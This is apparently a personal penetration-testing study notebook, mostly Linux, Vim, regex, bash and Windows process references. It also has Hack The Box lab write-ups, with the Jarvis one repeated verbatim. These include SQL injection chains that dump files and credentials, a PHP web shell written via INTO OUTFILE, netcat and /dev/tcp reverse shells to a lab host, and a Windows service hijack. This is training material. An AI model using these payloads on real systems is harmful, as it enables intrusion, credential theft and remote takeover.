		Interfaces 	Routing 	DNS
		ARP 	Services 	VPN
		IP Subnets 	Shares 	Network Traffic

	Companies must adhere to data security regulations depending on the type of data involved. These include, but are not limited to:
		Type of Information 	Security Regulation
		Credit Card Account Information 	Payment Card Industry (PCI)
		Electronic Patient Health Information 	Health Insurance Portability and Accountability Act (HIPAA)
		Consumers Private Banking Information 	Gramm-Leach-Bliley (GLBA)
		Government Information 	Federal Information Security Management Act of 2002 (FISMA)
		
	Some frameworks companies may follow include:
			
		(NIST) - National Institute of Standards and Technology 	(CIS Controls) - Center for Internet Security Controls
		(ISO) - International Organization for Standardization 	(PCI-DSS) - The Payment Card Industry Data Security Standard
		(GDPR) - General Data Protection Regulation 	(COBIT) - Control Objectives for Information and Related Technologies
		(FedRAMP) - The Federal Risk and Authorization Management Program 	(ITAR) - International Traffic in Arms Regulations
		(AICPA) - American Institute of Certified Public Accountants 	(NERC CIP Standards) - NERC Critical Infrastructure Protection Standards
-=-=-=-




    

Academy_HTB
Linux fundamentals(https://www.pathname.com/fhs/pub/fhs-2.3.pdf)
| *Command* | *Description* |
| --------------|-------------------|
| `man <tool>` | Opens man pages for the specified tool. | 
| `<tool> -h` | Prints the help page of the tool. | 
| `apropos <keyword>` | Searches through man pages' descriptions for instances of a given keyword. | 
| `cat` | Concatenate and print files. |
| `whoami` | Displays current username. | 
| `id` | Returns users identity. | 
    The adm group means that the user can read log files in /var/log
| `hostname` | Sets or prints the name of the current host system. | 
| `uname` | Prints operating system name. | 
    uname -p //Processor type
    uname -i //Hardware plaftorm
| `pwd` | Returns working directory name. | 
| `ifconfig` | The `ifconfig` utility is used to assign or view an address to a network interface and/or configure network interface parameters. | 
| `ip` | Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels. | 
| `netstat` | Shows network status. | 
| `ss` | Another utility to investigate sockets. | 
  ss -l -4 | grep -E "LISTEN" | grep -vE "127.0.0.*" |wc -l
| `ps` | Shows process status. | 
| `who` | Displays who is logged in. | 
| `env` | Prints environment or sets and executes a command. | 
| `lsblk` | Lists block devices. | 
| `lsusb` | Lists USB devices. | 
| `lsof` | Lists opened files. | 
| `lspci` | Lists PCI devices. | 
| `sudo` | Execute command as a different user. | 
| `su` | The `su` utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser).  A shell is then executed. | 
| `useradd` | Creates a new user or update default new user information. | 
| `userdel` | Deletes a user account and related files. |
| `usermod` | Modifies a user account. | 
| `addgroup` | Adds a group to the system. | 
| `delgroup` | Removes a group from the system. | 
| `passwd` | Changes user password. |
| `dpkg` | Install, remove and configure Debian-based packages. | 
    dpkg -i strace_4.21-1ubuntu1_amd64.deb
    dpkg -i | grep -c "^ii" //List total packages installed on the target system
| `apt` | High-level package management command-line utility. | 
    A package is an archive file containing multiple ".deb" files.
    cat /etc/apt/sources.list
    APT uses a database called the APT cache. This is used to provide information about packages installed on our system offline.
        apt-cache search impacket
        apt-cache show impacket-scripts
        apt list --installed
| `aptitude` | Alternative to `apt`. | 
| `snap` | Install, remove and configure snap packages. |
| `gem` | Standard package manager for Ruby. | 
| `pip` | Standard package manager for Python. | 
| `git` | Revision control system command-line utility. | 
| `systemctl` | Command-line based service and systemd control manager. |
    Most Linux distributions have now switched to systemd. This daemon is an Init process started first and thus has the process ID (PID) 1. This daemon monitors and takes care of the orderly starting and stopping of other services. All processes have an assigned PID that can be viewed under /proc/ with the corresponding number. Such a process can have a parent process ID (PPID), known as the child process.
    Besides systemctl we can also use update-rc.d to manage SysV init script links. Let us have a look at some examples
        systemctl enable ssh
    systemctl list-units --type=service //list all services
| `ps` | Prints a snapshot of the current processes. | 
| `journalctl` | Query the systemd journal. | 
    journalctl -u ssh.service --no-pager //View logs 
| `kill` | 
    kill -l //
        The most commonly used are:
        Signal	Description
    1	SIGHUP - This is sent to a process when the terminal that controls it is closed.
    2	SIGINT - Sent when a user presses [Ctrl] + C in the controlling terminal to interrupt a process.
    3	SIGQUIT - Sent when a user presses [Ctrl] + D to quit.
    9	SIGKILL - Immediately kill a process with no clean-up operations.
    15	SIGTERM - Program termination.
    19	SIGSTOP - Stop the program. It cannot be handled anymore.
    20	SIGTSTP - Sent when a user presses [Ctrl] + Z to request for a service to suspend and they will not be executed further. To keep it running in the background, we have to enter the command bg to put the process in the background.

| `jobs` | Lists all processes that are running in the background. | 
| `fg` | Puts a process into the foreground. | 
| `bg` | Suspends the process but it keep it running in the background
| `curl` | Command-line utility to transfer data from or to a server. | 
| `wget` | An alternative to `curl` that downloads files from FTP or HTTP(s) server. |
| `python3 -m http.server` | Starts a Python3 web server on TCP port 8000. | 
| `ls` | Lists directory contents. | 
| `cd` | Changes the directory. |
| `clear` | Clears the terminal. | 
| `touch` | Creates an empty file. |
| `mkdir` | Creates a directory. | 
  mkidr -p Storage/local/user/documents //Add parent directories
| `tree` | Lists the contents of a directory recursively. |
| `mv` | Move or rename files or directories. | 
| `cp` | Copy files or directories. |
| `nano` | Terminal based text editor. | 
| `which` | Returns the path to a file or link. |
| `find` | Searches for files in a directory hierarchy. | 
  find / -type f -name *.conf -user root -size +20k -newermt 2020-03-03 -exec ls -al {} \; 2>/dev/null
  find / -type f -name *.conf -newermt 2020-03-03 -size +25k -size -28k -exec ls -al {} \; 2>/dev/null
  find /etc/ -name shadow 2> stderr.txt 1> stdout.txt //Redirect STDOUT and STDERR to separate files
| `updatedb` | Updates the locale database for existing contents on the system. |
| `locate` | Uses the locale database to find contents on the system. | 
| `more` | Pager that is used to read STDOUT or files. |
| `less` | An alternative to `more` with more features. Unlike more, when be closed the output does not remain in the terminal | 
| `head` | Prints the first ten lines of STDOUT or a file. |
| `tail` | Prints the last ten lines of STDOUT or a file. | 
| `sort` | Sorts the contents of STDOUT or a file. |
| `grep` | Searches for specific results that contain given patterns. | 
| `cut` | Removes sections from each line of files. |
| `tr` | Replaces certain characters. | 
| `column` | Command-line based utility that formats its input into multiple columns. |
  cat /etc/passwd | grep -Ev "nologin|false" | tr ":" " " | column -t
| `awk` | Pattern scanning and processing language. |
  cat /etc/passwd | grep -Ev "nologin|false" | tr ":" " "  | awk '{print $1, $NF}'
| `sed` | A stream editor for filtering and transforming text. | 
| `wc` | Prints newline, word, and byte counts for a given input. |
| `chmod` | Changes permission of a file or directory. |
| `chown` | Changes the owner and group of a file or directory. |
  chown root:root shell && ls -l shell

Path	Description
/	    The top-level directory is the root filesystem and contains all of the files required to boot the operating system before other filesystems are mounted as well as the files required to boot the other filesystems. After boot, all of the other filesystems are mounted at standard mount points as subdirectories of the root.
/bin	Contains essential command binaries.
/boot	Consists of the static bootloader, kernel executable, and files required to boot the Linux OS.
/dev	Contains device files to facilitate access to every hardware device attached to the system.
/etc	Local system configuration files. Configuration files for installed applications may be saved here as well.
/home	Each user on the system has a subdirectory here for storage.
/lib	Shared library files that are required for system boot.
/media	External removable media devices such as USB drives are mounted here.
/mnt	Temporary mount point for regular filesystems.
/opt	Optional files such as third-party tools can be saved here.
/root	The home directory for the root user.
/sbin	This directory contains executables used for system administration (binary system files).
/tmp	The operating system and many programs use this directory to store temporary files. This directory is generally cleared upon system boot and may be deleted at other times without any warning.
/usr	Contains executables, libraries, man files, etc.
/var	This directory contains variable data files such as log files, email in-boxes, web application related files, cron files, and more.

Working with Web Services
 For an Apache web server, we can use appropriate modules, which can encrypt the communication between browser and web server (mod_ssl), use as a proxy server (mod_proxy), or perform complex manipulations of HTTP header data (mod_headers) and URLs (mod_rewrite).

Navigation
  cd - //Jump back to the directory we were last in

Redirect STDIN Stream to a File
  We can also use the double lower-than characters (<<) to add our standard input through a stream. We can use the so-called End-Of-File (EOF) function of a Linux system file, which defines the input's end
  cat << EOF > stream.txt

An option for further locking down Linux systems is Security-Enhanced Linux (SELinux) or AppArmor. This is a kernel security module that can be used for security access control policies. In SELinux, every process, file, directory, and system object is given a label. Policy rules are created to control access between these labeled processes and objects and are enforced by the kernel. This means that access can be set up to control which users and applications can access which resources. SELinux provides very granular access controls, such as specifying who can append to a file or move it. Besides, there are different applications and services such as Snort, chkrootkit, rkhunter, Lynis, and others that can contribute to Linux's security.

Private browser setup
  firejail --private --dns=1.1.1.1 --dns=9.9.9.9 firefox -no-remote
  └──╼ $firejail --private=/home/m1l0js/work firefox --dns=1.1.1.1 --dns=9.9.9.9 -no-remote &

  a

Useful links
https://bashrcgenerator.com/
https://github.com/powerline/powerline
https://explainshell.com/


      



          
      


-=-=-
Portswigger
1.SQLi
show databases;
create database Twitch;
MariaDB [Twitch]> create table users(id int auto_increment primary key, username varchar(32), password varchar(32), subscription varchar(32));
MariaDB [Twitch]> select * from users where username='jefeturno' or 1=1;--';



-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=

JARVIS rooms ==> -1 order by 9-- - #testing ==> -1 union select 1,2,3,4,5,6,7-- - ==> -1 union select 1,2,"test",4,5,6,7-- - ==> -1 union select 1,2,database(),4,5,6,7-- - ==> sustitute with version() / user() / load_file("/etc/passwd") #If /etc/passwd not allowed convert it to hexadecimal ❯ echo "/etc/passwd" | tr -d '\n' | xxd -ps and load_file(0xVALUE) ==> load_file("/proc/net/tcp") / proc/net/fib_trie / home/user/.ssh/id_rsa ==> -1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata-- - #If does not show all databases you could add after schemata limit 0,1 / 1,1 ==> -1 union select 1,2,table_name,4,5,6,7-- - from information_schema.tables where table_schema="hotel" limit 0,1-- - ==> Replace with ... column_name ... from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- - #In column_name we could use group_concat(column_name) ==>

#For do it with CURL ❯ curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,user(),4,5,6,7-- -"  | grep price-room | html2text ===> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i : $(curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit $i,1-- -"  | grep price-room  | html2text)";done ==> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i: $(curl -s --connect-timeout 4  -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,name,4,5,6,7 from room limit $i,1-- -"  | grep price-room  | html2text)";done #This is the last query =====>> If there is nothing interest, we could try using into outfile ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,%22%3C?php%20system($_REQUEST[%27cmd%27]);%20?%3E%22,4,5,6,7%20into%20outfile%20%22/var/www/html/aj.php%22--%20- ==> After that we could send us a reverse shell http://10.129.227.147/aj.php?cmd=nc%20-e%20/bin/bash%2010.10.14.33%204444 

###Another way would be using this query ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user--%20- ==> Crack these hash ==> hashcat --example-hashes | grep -i "sha1" ==> We have credentials DBadmin:imissyou ==> 2 ways >> 1. Check version and using searchsploit or in SQL create a query like 'SELECT "MI EJEMPLO" into outfile "/var/www/html/probando.txt" and the same way.
Privilege escalation ==> sudo -l ==> sudo -u pepper /var/www/Admin-Utilities/simpler.py ==> Test if it is correct sanitized 10.10.14.3$(echo 3) and use tcpdump -i tun0 -nc ==> Create /tmp/reverse.sh >nc -e /bin/bash 10.10.14.33 5555 ==> Once you are in       
        
            
        




          
        



      
      
          
      
      



          
      


-=-=-
Portswigger
1.SQLi
show databases;
create database Twitch;
MariaDB [Twitch]> create table users(id int auto_increment primary key, username varchar(32), password varchar(32), subscription varchar(32));
MariaDB [Twitch]> select * from users where username='jefeturno' or 1=1;--';



-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=
-==-=-=-=-=-=-=-=-=-=

JARVIS rooms ==> -1 order by 9-- - #testing ==> -1 union select 1,2,3,4,5,6,7-- - ==> -1 union select 1,2,"test",4,5,6,7-- - ==> -1 union select 1,2,database(),4,5,6,7-- - ==> sustitute with version() / user() / load_file("/etc/passwd") #If /etc/passwd not allowed convert it to hexadecimal ❯ echo "/etc/passwd" | tr -d '\n' | xxd -ps and load_file(0xVALUE) ==> load_file("/proc/net/tcp") / proc/net/fib_trie / home/user/.ssh/id_rsa ==> -1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata-- - #If does not show all databases you could add after schemata limit 0,1 / 1,1 ==> -1 union select 1,2,table_name,4,5,6,7-- - from information_schema.tables where table_schema="hotel" limit 0,1-- - ==> Replace with ... column_name ... from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- - #In column_name we could use group_concat(column_name) ==>

#For do it with CURL ❯ curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,user(),4,5,6,7-- -"  | grep price-room | html2text ===> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i : $(curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit $i,1-- -"  | grep price-room  | html2text)";done ==> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i: $(curl -s --connect-timeout 4  -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,name,4,5,6,7 from room limit $i,1-- -"  | grep price-room  | html2text)";done #This is the last query =====>> If there is nothing interest, we could try using into outfile ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,%22%3C?php%20system($_REQUEST[%27cmd%27]);%20?%3E%22,4,5,6,7%20into%20outfile%20%22/var/www/html/aj.php%22--%20- ==> After that we could send us a reverse shell http://10.129.227.147/aj.php?cmd=nc%20-e%20/bin/bash%2010.10.14.33%204444 

###Another way would be using this query ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user--%20- ==> Crack these hash ==> hashcat --example-hashes | grep -i "sha1" ==> We have credentials DBadmin:imissyou ==> 2 ways >> 1. Check version and using searchsploit or in SQL create a query like 'SELECT "MI EJEMPLO" into outfile "/var/www/html/probando.txt" and the same way.
Privilege escalation ==> sudo -l ==> sudo -u pepper /var/www/Admin-Utilities/simpler.py ==> Test if it is correct sanitized 10.10.14.3$(echo 3) and use tcpdump -i tun0 -nc ==> Create /tmp/reverse.sh >nc -e /bin/bash 10.10.14.33 5555 ==> Once you are in find \-perm -4000 2>/dev/null ==> 

database(), version() / schema_name from information_schema.schemata / table_name from information_schema.tables where table_schema / column_name from information_schema.columns where table_schema and table_name

-=-=-=-=-=-=-=-=
Validation machine ==> 
<h1>Hola</h1> (HTML injection vulnerable) //<script>alert("XSS")</script> (XSS vulnerable) ==> Let's how one of the parameters are send with burpsuite ==> burpsuite &> /dev/null & ==> SQLi ==> In the POST request username=suspicious&country=Brazil' union select version()-- - ==> username=suspicious&country=Brazil' union select "test"-- - //Test appears on the screen ==> username=suspicious&country=Brazil' union select schema_name from information_schema.schemata-- - ==> username=suspicious&country=Brazil' union select table_name from information_schema.tables where table_schema="registration"-- - ==>
username=suspicious&country=Brazil' union select column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- - ==> username=suspicious&country=Brazil' union select group_concat(username,0x3a,userhash) from registration-- - //It does not work, let's try with into outfile ==> username=suspicious&country=Brazil' union select "loquesea" into outfile "/var/www/html/dog.txt"-- - ==>
username=baduser&country=Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/test.php"-- -
//validation.py 
  pdb.set_trace()
    l
    p filename
    p main_url
//Another SQLi ==> static php cookie ==> ❯ echo -n 'm1l0js' | md5sum f49775f4b37981eb269a05abccba27cf ==> Use it in storage(developer tools)
//Use burpsuite in cmd parameter and urlencode the data

-=-=-=-=-=-
Return machine ==> 10.129.95.241
Open targetedXML with xsltproc ==> ❯ sudo xsltproc targetedXML > /var/www/html/index.html && service apache2 start ==> Perfect for Reports (LaTex) and so on.
whatweb http://10.129.95.241 -v ==> In http://10.129.95.241/settings.php change server address to your IP ==> 
Does this user belongs to the remote management users? 
Ways to privesc ==> net user svc-printer ==> Search in Google "Server operators microsoft" ==> Start and stop services ==> 
sc.exe create reverse binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.37 443" //Send us a reverse shell 
PS C:\Users\svc-printer\Desktop> sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.37 443"
sc.exe stop VMTools
(nc -nvlp 443)
sc.exe start VMTools

-=-=-=-=-=-=
Tentacle machine ==> 10.129.3.71
nvim /etc/hosts ==> 10.129.3.71 realcorp.htb srv01.realcorp.htb
dig @10.129.3.71 realcorp.htb
;; AUTHORITY SECTION:
realcorp.htb.           86400   IN      SOA     realcorp.htb. root.realcorp.htb. 199609206 28800 7200 2419200 86400

dig @10.129.3.71 realcorp.htb ns
;; ADDITIONAL SECTION:
ns.realcorp.htb.        259200  IN      A       10.197.243.77

vim /etc/proxychains.conf ==> http 10.129.3.71 3128
❯ dnsenum --dnsserver 10.129.3.71 --threads 20 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt realcorp.htb
Authentication in SSH with kerberos
apt install krb5-user OR dpkg-reconfigure krb5-config
knit j.nakasawa
klist 
kdestroy
.k5login
Privesc with pkexec 
	https://github.com/berdav/CVE-2021-4034














----------------------------------------------------------=================-----------------------
find
	-type d(only find directories) || f(find files)
	-name || -iname: Case insensitive
	-user: The username of the owner of a file
	-size: -n/+n/n can be used, where n is a number. To specify a size, you also need a sufix. c=bytes, k=KB and M=MBs. Example: If you want to specify a size less than 30 bytes, the argument -30c should be used
	-perm: To specify permissions.
		You can use - prefix to return files with at least the permissions you specify. This means that the -444 mode will match files that are readable by everyone, even if someone also has write and/or execute permissions.
		Using the / prefix will return files that match any of the permissions you have set. This means that the /666 mode will match files that are readable and writeable by at least one of the groups(owner,group or others)
	-a,m,c with min(for minutes) and time(days).
		-a:accesed
		-m:modified
		-c:changed
		Example:
		A file accesed more than 30 minutes ago: -amin +30
		Modified less than 7 days ago: -mtime -7
		A file modified within the last 24 hours: -mtime 0
	-exec: Example: -exec whoami \;

vim:
  :set shell=/bin/bash
  :shell


wget: Allows us to download files from the web via HTTP--as if you were accessing the file in your browser
SCP: Unlike the regular cp command, this command allows you to transfer files between two computers using the SSH protocol to provide both authentication and encryption
	To copy an example file from our machine to a remote machine	scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt
	To copy a file from a remote computer that we are not logged into:	scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt
python3 -m http.server: One flaw with this module is that you have no way of indexing, so you must know the exact name and location of the file that you wish to use.
	And alternative is updog(pip3 install updog)
Viewing processes:
	ps aux: To see the processes run by other users and those that don't run from a session(i.e. system processes)
	top
	kill: Below are some of the signals that we can send to a process when it is killed
		SIGTERM: Kill the process, but allow it to do some cleanup tasks beforehand
		SIGKILL: Kill the process - doesn't do any cleanup after the fact
		SIGSTOP: Stop/suspend a process
	Once a system boots and it initialises, systemd is one of the first processes that are started. Any program or piece of software that we want to start will start as what's known as a child process of systemd. This means that it is controlled by systemd, but will run as its own process(although sharing the resources from systemd) to make it easier for us to identify and the likes.
	We can do four options with systemctl(This command allows us to interact with the systemd process/daemon)
		Start
		Stop
		Enable
		Disable
	When excuting things like scripts --rather than relying on the & operator, we can use ctrl + z on our keyboard to background a process.
	fg: To bring the background process back into use on the terminal, where the output of the script is now returned to use

crontabs: One of the processes that is started during boot, which is responsible for facilitating and managing cron jobs. It is simply a special file with formatting that is recognised by the cron. It requires 6 specific values:
	MIN: What minute to execute at
	HOUR: What hour to execute at
	DOM: What day of the month to execute at
	MON: What month of the year to execute at
	DOW: What day of the week to execute at
	CMD: The actual command that will be executed

	Example: 0 *12 * * * cp -R /home/andres/Documents /var/backups/
	crontab -e: Crontabs can be edited

package management:
	add-apt-repository. Whilst you can install software through the use of package installers such as dpkg. The benefits os apt means that whenever we update our system, the repository that contains the pieces of software that we add also gets checked for updates
	When adding software, the integrity of what we download is guaranteed by the use of what is called GPG(Gnu Privacy Guard) keys.
	Example:
		wget -qo - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -
		A good practice is to have a separate file for every different community/3rd party repository that we add
			in /etc/apt/sources.list.d touch sublime-text.list
			nano sublime-text.list
			deb https://download.sublimetext.com/ apt/stable/
		apt update: After that, we need to update apt to recognise this new entry
		apt install sublime-text
		add-apt-repository --remove  and after apt remove sublime-text: To remove packages
Vim

	i: Insert at the beginning of the line
	A: Append to the final
        daw : delete the word under the cursor    
        caw : delete the word under the cursor and put you in insert mode
	dw: Until the start of the next word, EXCLUDING its first character
	de: To the end of the current word, INCLUDING the last character
	d$: Delete to the end of the line, INCLUDING the last character
	2w: Move the cursor two word forward
	3e: Move the cursor to the end of the third word forward
	0:  Move to the start of the line
	d2w: To delete the consecutive words
	dd: Delete a line
	2dd: Delete two lines
	u: Undo the last commands
	U: To fix a whole line
	r: To replace the character
	ce: To change until the end of a word
	c$: To change the rest of the line
	Ctrl G: Displays your location in the file
	G: To move you to the bottom of the file
	gg: To move you to the start of the file
	5G: To move to the line 5
	/: To search
		n: To search for the same prase again
		N: In the opposite direction
	?: To search for a phrase in the backward direction
		Ctrl o: To go back further
		Ctrl i: Goes forward
	%: Move the cursor to the other (,{ or {
	:s/old/new/g:To substitute 'new' for 'old'
		:#,#s/old/new/g: Where # are the line numbers of the range of lines where the substitution is to be done.
		:%s/old/new/gc: To find every occurrence in the whole file, with a prompt whether to substitute or not
	:!ls: Execute an external command
	:w TEST: Where TEST is the filename you chose
	:!del or rm: To remove
	v: Visual mode
	:r TEST: To retrieve the file and puts it below the cursor
	o: Open up a line BELOW the cursor and place you in Insert mode
	O: El contrario
	a: To append text AFTER the cursor
	a,i and A all go to the same Insert mode, the only difference is where
	R: To replace more than one character
	y: Copy text
	p: Paste it
	:set xxx: Where
		ic: ignorecase >> Ignore upper/lower case when searching
		is: incsearch >> Show partial matches for a search phrase
		hls: hlsearch >> Highlith all matching phrases
	Prepend no to switch an option off: :set noic

Regular expressions:
	[abc]: a,b,c (every occurrence of each letter)
	[abc]zz will match azz, bzz and czz. You can also use a - to define ranges:
		[a-c]zz is the same as above
	[a-cx-z]zz will match azz,bzz,czz,xzz,yzz and zzz
	[a-zA-Z] will match any single letter(lowercase or uppercase)
	file[1-3] will match file1,file2 and file3
	[^k]ing will match ring,sing,$ing but not king
	[^a-c]at will match fat and hat, but not bat or cat
  > The period . allows selecting any character, including special characters and spaces. '.' is the wildcard that is used to match any single character(except the line break)
		a.c will match aac,abc,a0c,a!c and so on.
		a\.c: If you want to search for a literal dot
	? character optional.
		abc? will match ab and abc sinc de c is optional
	\d matches a digit, like 9
	\D matches a non-digit, like A or @
	\w matches an alphanumeric character, like a or 3. _ are included here.
	\W matches a non-alphanumeric character, like ! or #.
	\s matches a whitespace character (spaces, tabs, and line breaks)
	\S matches everything else (alphanumeric characters and symbols)
	{12} - exactly 12 times.
	{1,5} - 1 to 5 times.
	{2,} - 2 or more times.
	* - 0 or more times.
	+ - 1 or more times.
  ^\W+\.pdf% ==> Fnd files with the pdf extension
    

Bash scripting
https://tldp.org/LDP/abs/html/ #Advanced bash scripting
	#!/bin/bash
	set -x and set +x to debug code
	unset transport[1]: to remove an element in an array

#Example
if [ x ]; then
  docommand
elif [ y ]; then
  doothercommand
else
  dosomethingelse
fi

#Other
#!/bin/bash
for i in $( ls ); do
  echo item: $i
done

#Other with seq
#!/bin/bash
for i in `seq 1 10`;
do 
  echo $i
done

#While loop
while [condition]; do <command1>;<command2>;done

#Read line
while read line; do echo $line; done < file.txt


	-eq: Checks if the value of two operands are equal or not; if yes, then the condition becomes true.
	-ne: Checks if the value of two operands are equal or not; if values are not equal, then the condition becomes true.
	-gt: Checks if the value of left operand is greater than the value of right operand; if yes, then the condition becomes true.
	-lt: Checks if the value of left operand is less than the value of right operand; if yes, then the condition becomes true.
	-ge: Checks if the value of left operand is greater than or equal to the value of right operand; if yes, then the condition becomes true.
	-f: Checks if the file exists
	-w: Checks if the file is writable. Without write permissions we would not be able to output our text into the file
	read: To insert text

        curl -G: To change request methot to GET
        curl --proxy http://localhost:8080 : To use Burp
        cp /bin/bash /dev/shm/ajgs
          /dev/shm/ajgs -c '/dev/shm/ajgs -i >& /dev/tcp/10.10.14.47/4126 0>&1'


DNS:
nslookup --type=CNAME shop.website.thm
	Different types: A, AAAA, CNAME, MX and TXT among others.

Windows:
    C:\Windows\system32\cmd.exe
    path ==> Like in linux by separated through the ','
      First => built-in commands
      Second => PATH
    To list windows variables use 'set'
      echo %path% or echo %username%
    List files in a directory using for loop
      for %i in (*.*) do @echo FILE: %i #'@' is for hide the command prompt
    %windir%: The system  environment variable for the Windows directory
    lusrmgr.msc:  Local User and Group Management
        If you type 'other users' will redirect you to lusrmgr
    gpedit.msc : Local Group Policy Editor
    msconfig
        winver: Display Windows version information
        UserAccountControlSettings
        control.exe /name Microsoft.Troubleshooting
        control.exe system: View basic information about your computer system settings
        control /name Microsoft.WindowsUpdate
        compmgmt.msc: View and configure system settings and components
        msinfo32: View advanced information about hardware and software settings
        eventvwr.msc
        appwiz.cpl
        inetcpl.cpl: View internet properties
        cmd.exe /k %windir%\system32\ipconfig.exe
        perfmon: Monitor the performance of local or remote computers
        resmon: Monitor the performance and resource usage of the local computers
        taskmgr.exe /7
        regedt32.exe
        compmgmt: Administracion de equipos
        net
        wf.msc: Windows Firewall

    Event Viewer
        C:\windows\system32\winevt\logs
        wevtutil /el | Measure-Object : How many log names are in the machine
        wevtutil qe application /c:3 /rd:true /f:text : Count, reverse direction and format
        The Get-WinEvent cmdlet replaces the Get-EventLog cmdlet.
        Get-WinEvent -FilterHashtable @{logname='application'; ProviderName='WLMS'}
        Get-WinEvent -LogName application -FilterXPath 'Event/System/EventID=100': This queries start with '*' or 'Event'
        Get-WinEvent -logname application -FilterXPath 'Event/System/Provider[@Name="WLMS"] and Event/System/EventID=100'
        Get-WinEvent -logname security -FilterXPath 'Event/EventData/Data[@Name="TargetUserName"]="System"' -MaxEvents 5
        Get-WinEvent -path C:\Users\Administrator\Desktop\merged.evtx -FilterXPath 'Event/System/EventID=4104 and Event/EventData/Data[@Name="ScriptBlockText"]' -Oldest -MaxEvents 1 | Format-List
        Get-WinEvent -path C:\Users\Administrator\Desktop\merged.evtx -FilterXPath 'Event/System/EventID=4799'  -MaxEvents 2 | fl -Property *




    Core windows processes
        Tools better than taskmgr.exe: Process hacker and process explorer
        The first Windows process on the list is System. It was mentioned in a previous section that a PID for any given process is assigned at random, but that is not the case for the System process. The PID for System is always 4.
            What is unusual behavior for this process?
                A parent process (aside from System Idle Process (0))
                Multiple instances of System. (Should only be 1 instance)
                A different PID. (Remember that the PID will always be PID 4)
                Not running in Session 0
            The next process is smss.exe (Session Manager Subsystem). This process, also known as the Windows Session Manager, is responsible for creating new sessions. This is the first user-mode process started by the kernel.

            This process starts the kernel mode and user mode of the Windows subsystem (you can read more about the NT Architecture here). This subsystem includes win32k.sys (kernel mode), winsrv.dll (user mode), and csrss.exe (user mode).

            Smss.exe starts csrss.exe (Windows subsystem) and wininit.exe in Session 0, an isolated Windows session for the operating system, and csrss.exe and winlogon.exe for Session 1, which is the user session. The first child instance creates child instances in new sessions. This is done by smss.exe copying itself into the new session and self-terminating.
            What is unusual?

                A different parent process other than System(4)
                Image path is different from C:\Windows\System32
                More than 1 running process. (children self-terminate and exit after each new session)
                User is not SYSTEM
                Unexpected registry entries for Subsystem

            As mentioned in the previous section, csrss.exe (Client Server Runtime Process) is the user-mode side of the Windows subsystem. This process is always running and is critical to system operation. If by chance this process is terminated it will result in system failure. This process is responsible for the Win32 console window and process thread creation and deletion. For each instance csrsrv.dll, basesrv.dll, and winsrv.dll are loaded (along with others).

            This process is also responsible for making the Windows API available to other processes, mapping drive letters, and handling the Windows shutdown process.

            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process masquerading as csrss.exe in plain sight
                User is not SYSTEM

            The Windows Initialization Process, wininit.exe, is responsible for launching services.exe (Service Control Manager), lsass.exe (Local Security Authority), and lsaiso.exe within Session 0. This is another critical Windows process that runs in the background, along with its child processes.


            Note: lsaiso.exe is a process associated with Credential Guard and Key Guard. You will only see this process if Credential Guard is enabled.
            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                Multiple running instances
                Not running as SYSTEM

            The next process is the Service Control Manager (SCM), which is services.exe. Its primary responsibility is to handle system services: loading services, interacting with services, starting/ending services, etc. It maintains a database that can be queried using a Windows built-in utility, 'sc.exe.'


            Information regarding services is stored in the registry, HKLM\System\CurrentControlSet\Services.

            What is unusual?

                A parent process other than wininit.exe
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                Multiple running instances
                Not running as SYSTEM

            The Service Host (Host Process for Windows Services), or svchost.exe, is responsible for hosting and managing Windows services

            What is unusual?

                A parent process other than services.exe
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                The absence of the -k parameter


            "Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens. It also writes to the Windows Security Log."
            There are two types of access tokens:

              primary access tokens: those associated with a user account that are generated on log on
              impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

          For an impersonation token, there are different levels:

